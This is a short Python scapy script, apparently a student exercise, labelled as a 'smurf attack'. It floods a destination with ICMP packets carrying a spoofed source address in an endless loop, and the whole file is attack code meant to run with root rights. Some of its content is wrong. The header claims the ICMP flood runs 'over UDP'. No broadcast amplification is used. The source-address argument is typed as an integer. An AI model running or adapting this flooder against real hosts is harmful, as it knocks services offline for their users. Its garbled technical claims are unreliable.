"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : ICMP flood over UDP ("smurf attack")
"""

# Imports
from scapy.all import *
from scapy.layers.inet import *
import argparse
import sys


def __configure_argparse__():
    """Configure argparser

    Returns:
       parser: Arguments parser
    """
    parser = argparse.ArgumentParser(
        description='ICMP attack arguments')

    # Required params
    requiredNamed = parser.add_argument_group('Optionnal named arguments')
    requiredNamed.add_argument(
        '-d', '--dst', help='Destination address', required=True)
    requiredNamed.add_argument(
        '-s', '--src', type=int, help='Source address', required=True)
    requiredNamed.add_argument(
        '-i', '--iface', help='Interface', required=True)

    return parser


def main(source_ip, destination_ip, iface):
    """Main method to handle attack logic

    Args:
        source_ip (str): Source IP
        destination_ip (str): Destination IP
        iface (str): Network interface
    """
    # Send ICMP packet
    while True:
        send(IP(src=source_ip, dst=destination_ip) / ICMP(), iface=iface)

# Entry point
# Run this script in sudo mode !
if __name__ == "__main__":
    parser = __configure_argparse__()
    args = parser.parse_args()
    main(args.src, args.dst, args.iface)
